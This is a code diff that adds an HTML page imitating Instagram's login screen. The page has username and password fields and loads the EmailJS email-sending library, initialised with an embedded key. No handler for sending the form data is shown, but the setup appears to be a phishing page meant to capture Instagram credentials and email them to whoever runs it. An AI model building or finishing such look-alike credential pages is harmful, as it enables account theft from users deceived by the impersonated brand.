@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fafafa;
+        }
+        .login-container {
+            background: #fff;
+            padding: 20px;
+            width: 350px;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+        }
+        .login-container h1 {
+            font-family: 'Billabong', cursive;
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .login-btn {
+            width: 100%;
+            background-color: #3897f0;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+        .or {
+            margin: 10px 0;
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+        .facebook-login {
+            color: #385185;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .forgot-password {
+            display: block;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #00376b;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Instagram</h1>
+        <form id="form">
+            <input type="text" name="username" id="username" class="input-field" placeholder="Phone number, username, or email">
+            <input type="password" name="password" id="password" class="input-field" placeholder="Password">
+            <input type="submit" id="button" class="login-btn" value="Log in">
+        </form>
+        <div class="or">OR</div>
+        <a href="#" class="facebook-login">Log in with Facebook</a>
+        <a href="#" class="forgot-password">Forgot password?</a>
+    </div>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        emailjs.init('XqfKGhZn3iL4xul-s');
+    </script>
+</body>
+</html>
